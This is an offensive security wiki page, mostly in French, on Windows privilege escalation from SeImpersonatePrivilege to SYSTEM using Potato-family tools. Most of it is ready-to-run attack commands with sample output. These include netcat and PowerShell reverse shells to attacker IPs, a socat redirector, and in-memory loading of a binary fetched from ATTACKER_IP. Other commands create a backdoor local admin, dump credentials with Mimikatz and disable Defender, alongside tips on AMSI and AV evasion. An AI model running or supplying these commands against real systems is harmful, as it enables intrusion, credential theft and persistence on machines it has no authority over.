# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne fonctionne pas** sur Windows Server 2019 et Windows 10 build 1809 et ultérieurs. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** peuvent être utilisés pour **exploiter les mêmes privilèges et obtenir un accès au niveau `NT AUTHORITY\SYSTEM`**. Ce [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) analyse en profondeur l'outil `PrintSpoofer`, qui peut être utilisé pour abuser des privilèges d'usurpation d'identité sur des hôtes Windows 10 et Server 2019 où JuicyPotato ne fonctionne plus.

> [!TIP]
> Une alternative moderne, fréquemment maintenue en 2024–2025, est SigmaPotato (un fork de GodPotato) qui ajoute l'utilisation en mémoire / reflection .NET et un support OS étendu. Voir l'utilisation rapide ci-dessous et le repo dans Références.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Prérequis et pièges courants

Toutes les techniques suivantes reposent sur l'abus d'un service privilégié capable d'usurper l'identité depuis un contexte disposant de l'un des privilèges suivants :

- SeImpersonatePrivilege (le plus courant) ou SeAssignPrimaryTokenPrivilege
- Une intégrité élevée n'est pas requise si le token possède déjà SeImpersonatePrivilege (typique pour de nombreux comptes de service tels que IIS AppPool, MSSQL, etc.)

Vérifiez rapidement les privilèges :
```cmd
whoami /priv | findstr /i impersonate
```
Notes opérationnelles :

- Si votre shell s'exécute sous un token restreint ne disposant pas de SeImpersonatePrivilege (fréquent pour Local Service/Network Service dans certains contextes), restaurez les privilèges par défaut du compte avec FullPowers, puis lancez un Potato. Exemple : `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer a besoin du service Print Spooler en cours d'exécution et accessible via le point de terminaison RPC local (spoolss). Dans des environnements durcis où Spooler est désactivé après PrintNightmare, préférez RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiert un résolveur OXID accessible sur TCP/135. Si l'accès sortant est bloqué, utilisez un redirector/port-forwarder (voir exemple ci-dessous). Les versions plus anciennes nécessitaient le flag -f.
- EfsPotato/SharpEfsPotato exploitent MS-EFSR ; si une pipe est bloquée, essayez des pipes alternatives (lsarpc, efsrpc, samr, lsass, netlogon).
- L'erreur 0x6d3 lors de RpcBindingSetAuthInfo indique typiquement un service d'authentification RPC inconnu/non supporté ; essayez une autre pipe/transport ou assurez-vous que le service cible est en cours d'exécution.
- Les forks "kitchen-sink" tels que DeadPotato regroupent des modules de payload supplémentaires (Mimikatz/SharpHound/Defender off) qui touchent le disque ; attendez-vous à une détection EDR plus élevée comparée aux versions minimalistes originales.

## Démo rapide

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notes:
- Vous pouvez utiliser -i pour lancer un processus interactif dans la console actuelle, ou -c pour exécuter un one-liner.
- Nécessite le service Spooler. Si désactivé, cela échouera.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si outbound 135 est bloqué, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato est une primitive d’abus COM plus récente publiée fin 2022 qui cible le service **PrintNotify** au lieu de Spooler/BITS. Le binaire instancie le serveur COM PrintNotify, injecte un faux `IUnknown`, puis déclenche un callback privilégié via `CreatePointerMoniker`. Quand le service PrintNotify (tournant en tant que **SYSTEM**) se reconnecte, le processus duplique le token retourné et lance la payload fournie avec tous les privilèges.

Key operational notes:

* Fonctionne sur Windows 10/11 et Windows Server 2012–2022 tant que le service Print Workflow/PrintNotify est installé (il est présent même lorsque le Spooler legacy est désactivé après PrintNightmare).
* Nécessite que le contexte appelant possède **SeImpersonatePrivilege** (typique pour IIS APPPOOL, MSSQL, et les comptes de service de tâches planifiées).
* Accepte soit une commande directe soit un mode interactif afin que vous puissiez rester dans la console d’origine. Exemple:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Parce qu’il est purement basé sur COM, aucun listener de named-pipe ni redirecteur externe n’est requis, ce qui en fait un remplacement direct sur les hôtes où Defender bloque le RPC binding de RoguePotato.

Des opérateurs tels qu’Ink Dragon exécutent PrintNotifyPotato immédiatement après avoir obtenu une RCE ViewState sur SharePoint pour pivoter du worker `w3wp.exe` vers SYSTEM avant d’installer ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Astuce : Si un pipe échoue ou si l'EDR le bloque, essayez les autres pipes pris en charge :
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Remarques:
- Fonctionne sur Windows 8/8.1–11 et Server 2012–2022 lorsque SeImpersonatePrivilege est présent.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fournit deux variantes ciblant les objets DCOM de service qui par défaut utilisent RPC_C_IMP_LEVEL_IMPERSONATE. Compilez ou utilisez les binaries fournis et exécutez votre commande :
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork mis à jour de GodPotato)

SigmaPotato ajoute des fonctionnalités modernes comme l'exécution en mémoire via .NET reflection et un assistant PowerShell pour reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Avantages supplémentaires dans les builds 2024–2025 (v1.2.x) :
- Option reverse shell intégrée `--revshell` et suppression de la limite PowerShell de 1024 caractères afin que vous puissiez lancer de longs payloads contournant AMSI en une seule fois.
- Syntaxe compatible reflection (`[SigmaPotato]::Main()`), plus une astuce rudimentaire d'évasion AV via `VirtualAllocExNuma()` pour perturber des heuristiques simples.
- Exécutable séparé `SigmaPotatoCore.exe` compilé pour .NET 2.0 pour les environnements PowerShell Core.

### DeadPotato (retravail de GodPotato 2024 avec modules)

DeadPotato conserve la chaîne d'usurpation OXID/DCOM de GodPotato mais intègre des aides post-exploitation pour que les opérateurs puissent immédiatement obtenir SYSTEM et effectuer persistance/collecte sans outils supplémentaires.

Modules courants (tous requièrent SeImpersonatePrivilege) :
- `-cmd "<cmd>"` — exécuter une commande arbitraire en tant que SYSTEM.
- `-rev <ip:port>` — reverse shell rapide.
- `-newadmin user:pass` — créer un administrateur local pour la persistance.
- `-mimi sam|lsa|all` — déposer et exécuter Mimikatz pour exfiltrer les identifiants (écrit sur le disque, bruyant).
- `-sharphound` — exécuter la collecte SharpHound en tant que SYSTEM.
- `-defender off` — désactiver la protection en temps réel de Defender (très bruyant).

Exemples de one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Parce qu'il embarque des binaires supplémentaires, attendez‑vous à davantage d'alertes AV/EDR ; utilisez les plus légers GodPotato/SigmaPotato lorsque la discrétion est nécessaire.

## Références

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
